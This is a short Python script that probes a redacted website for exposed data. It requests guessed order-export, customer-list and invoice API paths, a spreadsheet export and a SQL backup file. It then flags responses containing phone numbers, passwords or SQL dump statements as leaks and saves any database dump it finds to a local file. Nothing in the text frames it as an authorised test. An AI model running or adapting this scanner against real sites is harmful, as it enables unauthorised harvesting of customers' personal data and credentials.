import requests

site = "******"

paths = [
    "/api/OrderExport?startDate=2024-01-01&endDate=2024-12-31",
    "/api/OrderExport?startDate=2024-01-01&endDate=2024-12-31&token=*",
    "/api/CustomerList?page=1&size=100",
    "/api/InvoiceDownload?invoiceNo=INV-2024-0001",
    "/export/order_report_2024.xlsx",
    "/backup/crm_db_20240101.sql",
    "/static/upload/avatar/admin.png",
]

for p in paths:
    try:
        r = requests.get(site + p, timeout=8)
        if r.status_code != 404 and r.status_code != 403 and len(r.text) > 50:
            if "phone" in r.text.lower() or "mobile" in r.text.lower():
                print("pii leak: " + p)
            if "password" in r.text.lower() or "passwd" in r.text.lower():
                print("cred leak: " + p)
            if "CREATE TABLE" in r.text or "INSERT INTO" in r.text:
                print("db backup: " + p)
                open("leaked.sql", "w").write(r.text)
            if r.headers.get("Content-Type", "").find("excel") > -1 or r.headers.get("Content-Type", "").find("sheet") > -1:
                print("spreadsheet leak: " + p)
            if r.status_code == 200 and len(r.text) > 200:
                print("open api: " + p + " size:" + str(len(r.text)))
    except:
        pass
